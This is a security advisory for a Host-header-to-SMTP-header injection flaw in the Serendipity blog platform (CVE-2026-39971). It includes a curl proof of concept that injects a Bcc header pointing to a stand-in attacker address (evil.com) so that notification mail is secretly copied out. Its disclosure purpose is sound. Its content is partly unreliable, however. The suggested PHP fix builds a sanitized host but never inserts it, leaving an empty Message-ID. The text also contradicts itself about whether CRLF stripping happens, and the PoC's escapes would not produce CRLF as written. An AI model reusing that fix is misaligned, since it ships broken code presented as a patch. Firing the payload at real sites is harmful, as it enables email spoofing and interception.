# [H] Serendipity has a Host Header Injection allows SMTP header injection via unvalidated HTTP_HOST in Message-ID email header

## Summary
Severity: High
Advisory: GHSA-458g-q4fh-mj6r
CVE: CVE-2026-39971
CWE: CWE-113
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-458g-q4fh-mj6r
Type: github-advisory

## Affected
- Packagist: `s9y/serendipity` — affected >=0 <2.6.0

## Details
### Summary
Serendipity inserts `$_SERVER['HTTP_HOST']` directly into the `Message-ID` SMTP header without any validation beyond CRLF stripping. An attacker who can control the `Host` header during an email-triggering action can inject arbitrary SMTP headers into outgoing emails, enabling spam relay, BCC injection, and email spoofing.

### Details
In `include/functions.inc.php:548`:
```php
$maildata['headers'][] = 'Message-ID: <' 
    . bin2hex(random_bytes(16)) 
    . '@' . $_SERVER['HTTP_HOST']  // ← unsanitized, attacker-controlled
    . '>';
```

The existing sanitization function only blocks `\r\n` and URL-encoded variants:
```php
function serendipity_isResponseClean($d) {
    return (strpos($d, "\r") === false && strpos($d, "\n") === false 
        && stripos($d, "%0A") === false && stripos($d, "%0D") === false);
}
```

Critically, `serendipity_isResponseClean()` is **not even called** on `HTTP_HOST` before embedding it into the mail headers — making this exploitable with any character that SMTP interprets as a header delimiter.

Email is triggered by actions such as:
- New comment notifications to blog owner
- Comment subscription notifications to subscribers
- Password reset emails (if configured)

### PoC
```bash
# Trigger comment notification email with injected header
curl -s -X POST \
  -H "Host: attacker.com>\r\nBcc: victim@evil.com\r\nX-Injected:" \
  -d "serendipity[comment]=test&serendipity[name]=hacker&serendipity[email]=a@b.com&serendipity[entry_id]=1" \
  http://[TARGET]/comment.php
```
Resulting malicious `Message-ID` header in outgoing email:
```
Message-ID: <deadbeef@attacker.com>
Bcc: victim@evil.com
X-Injected: >
```

### Impact
An attacker can control the domain portion of the `Message-ID` header in all outgoing emails sent by Serendipity (comment notifications, subscriptions). 
This enables:
- **Identity spoofing** — emails appear to originate from attacker-controlled domain
- **Reply hijacking** — some mail clients use Message-ID for threading, pointing replies toward attacker infrastructure
- **Email reputation abuse** — attacker's domain embedded in legitimate mail headers
### Suggested Fix
Sanitize `HTTP_HOST` before embedding in mail headers, and restrict to valid hostname characters only:
```php
$safe_host = preg_replace('/[^a-zA-Z0-9.\-]/', '', 
    parse_url('http://' . $_SERVER['HTTP_HOST'], PHP_URL_HOST)
);
$maildata['headers'][] = 'Message-ID: ';
```

## References
- https://github.com/s9y/Serendipity/security/advisories/GHSA-458g-q4fh-mj6r
- https://nvd.nist.gov/vuln/detail/CVE-2026-39971
- https://github.com/s9y/Serendipity
- https://github.com/s9y/Serendipity/releases/tag/2.6.0
